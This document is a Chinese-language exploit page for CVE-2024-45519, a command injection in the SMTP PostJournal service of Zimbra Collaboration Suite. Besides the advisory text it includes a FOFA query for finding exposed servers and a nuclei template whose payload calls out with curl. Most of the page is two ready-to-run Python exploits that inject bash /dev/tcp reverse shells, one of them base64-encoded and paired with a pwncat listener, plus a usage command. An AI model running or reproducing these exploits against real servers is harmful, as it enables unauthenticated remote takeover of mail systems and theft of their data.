**漏洞名称**

Zimbra Collaboration Suite远程代码执行漏洞

**漏洞影响**

Zimbra Collaboration (ZCS) 8.8.15 补丁 46 之前的版本、9.0.0 补丁 41 之前的 9、10.0.9 之前的 10 以及 10.1.1 之前的版本。

**漏洞描述**



Zimbra Collaboration Suite的PostJournal服务中存在基于SMTP的漏洞，允许未经身份验证的攻击者注入任意命令。此漏洞是由于对SMTP输入的不严格过滤造成的，使攻击者能够制作恶意SMTP消息，在Zimbra用户上下文下执行命令。成功利用该漏洞可能导致未经授权的访问、权限升级。

**FOFA搜索语句**

```
icon_hash="1624375939"
```

**nuclei poc**

```yaml
id: CVE-2024-45519
info:
  name: Zimbra Collaboration Suite < 9.0.0 - Remote Code Execution
  author: pdresearch, iamnoooob, parthmalhotra, ice3man543
  severity: critical
  description: |
    SMTP-based vulnerability in the PostJournal service of Zimbra Collaboration Suite that allows unauthenticated attackers to inject arbitrary commands. This vulnerability arises due to improper sanitization of SMTP input, enabling attackers to craft malicious SMTP messages that execute commands under the Zimbra user context. Successful exploitation can lead to unauthorized access, privilege escalation, and potential compromise of the affected system's integrity and confidentiality.
  reference:
    - https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories
    - https://blog.projectdiscovery.io/zimbra-remote-code-execution/
  classification:
    cpe: cpe:2.3:a:synacor:zimbra_collaboration_suite:*:*:*:*:*:*:*:*
  metadata:
    vendor: synacor
    product: zimbra_collaboration_suite
    shodan-query:
      - http.title:"zimbra collaboration suite"
      - http.title:"zimbra web client sign in"
      - http.favicon.hash:1624375939
    fofa-query:
      - title="zimbra web client sign in"
      - title="zimbra collaboration suite"
  tags: cve, cve2024, rce, zimbra
javascript:
  - pre-condition: |
      isPortOpen(Host, Port);
    code: |
      let m = require('nuclei/net');
      let address = Host + ":" + Port;
      let conn;
      conn = m.Open('tcp', address);
      conn.Send('EHLO localhost\r\n');
      conn.RecvString();
      conn.Send('MAIL FROM: <aaaa@mail.domain.com>\r\n');
      conn.RecvString();
      conn.Send('RCPT TO: <"aabbb$(curl${IFS}' + oast + ')"@mail.domain.com>\r\n');
      conn.RecvString();
      conn.Send('DATA\r\n');
      conn.RecvString();
      conn.Send('aaa\r\n');
      conn.RecvString();
      conn.Send('.\r\n');
      resp = conn.RecvString();
      conn.Send('QUIT\r\n');
      conn.Close();
      resp
    args:
      Host: "{{Host}}"
      Port: 25
      oast: "{{interactsh-url}}"
  matchers-condition: and
  matchers:
    - type: word
      part: interactsh_protocol
      words:
        - "http"
    - type: word
      words:
        - "message delivered"
        
```

**EXP -POC**

```python
import socket

def is_port_open(host, port):
    """检查指定端口是否在目标主机上开放。"""
    try:
        sock = socket.create_connection((host, port), timeout=10)
        sock.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def smtp_payload_check_vulnerability(host, port, oast):
    """发送测试负载以检查RCE漏洞。"""
    try:
        with socket.create_connection((host, port), timeout=10) as conn:
            conn.send(b'EHLO localhost\r\n')
            conn.recv(1024)

            conn.send(b'MAIL FROM: <aaaa@mail.domain.com>\r\n')
            conn.recv(1024)

            rcpt_to_payload = f'RCPT TO: <"aabbb$(curl${{IFS}}{oast})"@mail.domain.com>\r\n'.encode()
            conn.send(rcpt_to_payload)
            conn.recv(1024)

            conn.send(b'DATA\r\n')
            conn.recv(1024)

            conn.send(b'aaa\r\n.\r\n')
            resp = conn.recv(1024)

            conn.send(b'QUIT\r\n')
            return resp.decode('utf-8')

    except Exception as e:
        return f"错误: {str(e)}"

def smtp_payload_exploit_reverse_shell(host, port, local_ip, local_port):
    """利用RCE漏洞建立反向Shell。"""
    reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
    try:
        with socket.create_connection((host, port), timeout=10) as conn:
            conn.send(b'EHLO localhost\r\n')
            conn.recv(1024)

            conn.send(b'MAIL FROM: <exploit@mail.domain.com>\r\n')
            conn.recv(1024)

            rcpt_to_payload = f'RCPT TO: <"exploit$(bash -c \'{reverse_shell}\')"@mail.domain.com>\r\n'.encode()
            conn.send(rcpt_to_payload)
            conn.recv(1024)

            conn.send(b'DATA\r\n')
            conn.recv(1024)

            conn.send(b'Exploit in action\r\n.\r\n')
            resp = conn.recv(1024)

            conn.send(b'QUIT\r\n')
            return resp.decode('utf-8')

    except Exception as e:
        return f"错误: {str(e)}"

def main():
    host = "target.domain.com"
    port = 25
    oast = "http://your-oast-url.com"
    local_ip = "your-local-ip"
    local_port = 4444

    if is_port_open(host, port):
        print(f"端口 {port} 在 {host} 上是开放的")

        print("检查漏洞...")
        response = smtp_payload_check_vulnerability(host, port, oast)
        print("SMTP 响应 (漏洞检查):\n", response)

        if "message delivered" in response:
            print("检测到漏洞！继续进行利用...")

            exploit_response = smtp_payload_exploit_reverse_shell(host, port, local_ip, local_port)
            print("SMTP 响应 (利用 - 反向Shell):\n", exploit_response)

        else:
            print("未检测到漏洞或无法利用。")
    else:
        print(f"端口 {port} 在 {host} 上是关闭的")

if __name__ == "__main__":
    main()
```



```python
import time
import base64
import socket
import threading
import pwncat.manager
import rich_click as click
from pwn import *
from faker import Faker


class SMTPExploit:
    def __init__(self, target, port, lhost, lport):
        self.target = target
        self.port = port
        self.lhost = lhost
        self.lport = lport
        self.mail_from = self.generate_random_email()
        self.rcpt_to = self.generate_random_email()
        self.sock = None
        self.command = self.generate_base64_revshell()

    def generate_random_email(self):
        """生成随机电子邮件地址。"""
        fake = Faker()
        return fake.email()

    def generate_base64_revshell(self):
        """生成Base64编码的反向Shell命令。"""
        revshell = f"/bin/bash -i 5<> /dev/tcp/{self.lhost}/{self.lport} 0<&5 1>&5 2>&5"
        base64_revshell = base64.b64encode(revshell.encode()).decode()
        payload = f"echo${{IFS}}{base64_revshell}|base64${{IFS}}-d|bash"
        return payload

    def generate_injected_rcpt_to(self):
        """生成注入的RCPT TO命令。"""
        return f'"aabbb$({self.command})@{self.rcpt_to}"'

    def connect(self):
        """连接到SMTP服务器。"""
        try:
            self.sock = remote(self.target, self.port)
            banner = self.sock.recv(4096)
            log.info(f"收到的欢迎信息: {banner.decode().strip()}")
        except Exception as e:
            log.error(f"连接到SMTP服务器失败: {e}")
            self.clean_exit()

    def send_smtp_command(self, command):
        """发送SMTP命令并接收响应。"""
        try:
            self.sock.sendline(command.encode())
            response = self.sock.recv(4096).decode().strip()
            log.info(f"响应: {response}")
            return response
        except EOFError:
            log.error("服务器关闭了连接。")
            self.clean_exit()
        except Exception as e:
            log.error(f"发送命令 '{command}' 时出错: {e}")
            self.clean_exit()

    def clean_exit(self):
        """关闭套接字并在失败时停止监听器。"""
        if self.sock:
            self.sock.close()
            log.info("连接已关闭")
        listener.listener_event.set()
        log.error("利用失败，退出。")
        exit(1)

    def run(self):
        """运行利用过程。"""
        log.info(f"连接到SMTP服务器 {self.target}:{self.port}...")
        self.connect()

        self.send_smtp_command("EHLO localhost")

        self.send_smtp_command(f"MAIL FROM: <{self.mail_from}>")

        injected_rcpt_to = self.generate_injected_rcpt_to()
        self.send_smtp_command(f"RCPT TO: <{injected_rcpt_to}>")

        self.send_smtp_command("DATA")

        self.sock.sendline("Test message".encode())
        self.sock.sendline(".".encode())
        data_response = self.sock.recv(4096).decode().strip()
        log.info(f"发送数据后的响应: {data_response}")

        self.send_smtp_command("QUIT")

        self.sock.close()
        log.success("利用成功完成！")


class Listener:
    def __init__(self, bind_host, bind_port):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.listener_event = threading.Event()

    def start_listener(self):
        """启动监听器以接收反向Shell连接。"""
        try:
            with socket.create_server((self.bind_host, self.bind_port)) as listener:
                log.info(f"监听 {self.bind_host}:{self.bind_port}...")
                listener.settimeout(1)
                while not self.listener_event.is_set():
                    try:
                        client, addr = listener.accept()
                        log.success(f"收到连接来自 {addr[0]}:{addr[1]}")
                        with pwncat.manager.Manager() as manager:
                            manager.create_session(
                                platform="linux", protocol="socket", client=client
                            )
                            manager.interactive()
                        break
                    except socket.timeout:
                        continue
        except Exception as e:
            log.error(f"启动监听器失败: {e}")


@click.command()
@click.argument("target")
@click.option(
    "-p",
    "--port",
    type=int,
    default=25,
    show_default=True,
    help="SMTP端口 (默认: 25)",
)
@click.option(
    "-lh",
    "--lhost",
    default="0.0.0.0",
    show_default=True,
    help="本地监听主机",
)
@click.option(
    "-lp",
    "--lport",
    type=int,
    default=4444,
    show_default=True,
    help="本地监听端口",
)
def main(target, port, lhost, lport):
    """利用Zimbra Postjournal SMTP漏洞执行任意命令。"""
    listener = Listener(lhost, lport)
    listener_thread = threading.Thread(target=listener.start_listener)
    listener_thread.start()

    time.sleep(1)

    exploit = SMTPExploit(target, port, lhost, lport)
    try:
        exploit.run()
    except Exception as e:
        log.error(f"利用过程中发生错误: {e}")

    listener_thread.join()


if __name__ == "__main__":
    main()
```

python exploit.py <target> -lh <attacker-ip> -lp <attacker-port> -p <smtp-port>

![图片](CVE-2024-45519%20Zimbra%20Collaboration%20Suite%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640.png)